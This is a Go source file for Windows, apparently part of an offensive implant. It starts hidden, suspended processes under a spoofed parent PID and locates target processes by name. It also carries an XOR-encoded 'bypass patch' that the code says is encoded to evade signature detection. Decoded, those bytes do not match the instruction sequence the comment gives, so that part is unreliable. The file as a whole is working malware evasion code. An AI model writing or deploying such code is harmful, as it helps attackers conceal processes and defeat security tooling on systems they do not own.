//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	processCreateProcess    = 0x0080
	processQueryLimitedInfo = 0x1000
)

// procThreadAttributeList holds the attribute list for extended process creation.
type procThreadAttributeList struct {
	dwFlags  uint32
	size     uintptr
	count    uint16
	reserved uint16
	unknown  uintptr
	entries  [1]procThreadAttributeEntry
}

type procThreadAttributeEntry struct {
	attribute uintptr
	cbSize    uintptr
	lpValue   uintptr
	unknown   uintptr
}

// createProcessWithPPIDSpoof creates a process with a spoofed parent PID.
// Returns hProcess, hThread, pid, error.
func createProcessWithPPIDSpoof(exePath string, cmdLine string, parentPID uint32) (uintptr, uintptr, uint32, error) {
	exePtr, _ := syscall.UTF16PtrFromString(exePath)
	var cmdPtr *uint16
	if cmdLine != "" {
		cmdPtr, _ = syscall.UTF16PtrFromString(cmdLine)
	}

	// Open the parent process with PROCESS_CREATE_PROCESS
	parentHandle, _, _ := procOpenProcess.Call(
		uintptr(processCreateProcess),
		0,
		uintptr(parentPID),
	)
	if parentHandle == 0 {
		return 0, 0, 0, fmt.Errorf("OpenProcess(%d) failed", parentPID)
	}
	defer procCloseHandle.Call(parentHandle)

	// Calculate required attribute list size
	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(
		0,
		1, // one attribute
		0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)

	// Allocate attribute list
	attrList := make([]byte, attrListSize)
	ret, _, _ := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		1, // one attribute
		0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if ret == 0 {
		return 0, 0, 0, fmt.Errorf("InitializeProcThreadAttributeList failed")
	}
	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))

	// Add parent process attribute
	ret, _, _ = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		uintptr(procThreadAttributeParentProcess),
		parentHandle,
		unsafe.Sizeof(parentHandle),
		0, 0,
	)
	if ret == 0 {
		return 0, 0, 0, fmt.Errorf("UpdateProcThreadAttribute failed")
	}

	// Set up startup info
	si := startupInfoExW{
		cb:            uint32(unsafe.Sizeof(startupInfoExW{})),
		dwFlags:       0x00000001, // STARTF_USESHOWWINDOW
		wShowWindow:   0,          // SW_HIDE
		attributeList: uintptr(unsafe.Pointer(&attrList[0])),
	}

	var pi processInformation

	ret, _, _ = procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exePtr)),
		uintptr(unsafe.Pointer(cmdPtr)),
		0, 0, 0,
		uintptr(createSuspended|extendedStartupInfoPresent),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return 0, 0, 0, fmt.Errorf("CreateProcessW with PPID spoof failed")
	}

	return pi.hProcess, pi.hThread, pi.dwProcessID, nil
}

// findPidByName finds the first process ID matching the given process name.
// Uses the existing process listing mechanism.
func findPidByName(name string) uint32 {
	procNameUpper := stringToUpper(name)

	hSnapshot, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if hSnapshot == 0 {
		return 0
	}
	defer procCloseHandle.Call(hSnapshot)

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))

	ret, _, _ := procProcess32First.Call(hSnapshot, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		exeName := syscall.UTF16ToString(pe.szExeFile[:])
		if stringToUpper(exeName) == procNameUpper {
			return pe.th32ProcessID
		}
		ret, _, _ = procProcess32Next.Call(hSnapshot, uintptr(unsafe.Pointer(&pe)))
	}
	return 0
}

//go:noinline
func decodeBypassPatch() []byte {
	// xor eax, eax; ret — encoded at rest to avoid static byte signature
	enc := []byte{0x40, 0xd1, 0xd2}
	for i := range enc {
		enc[i] ^= 0x71
	}
	return enc
}

// stringToUpper converts an ASCII string to uppercase in-place (avoids importing "strings").
func stringToUpper(s string) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'a' && c <= 'z' {
			c -= 32
		}
		b[i] = c
	}
	return string(b)
}
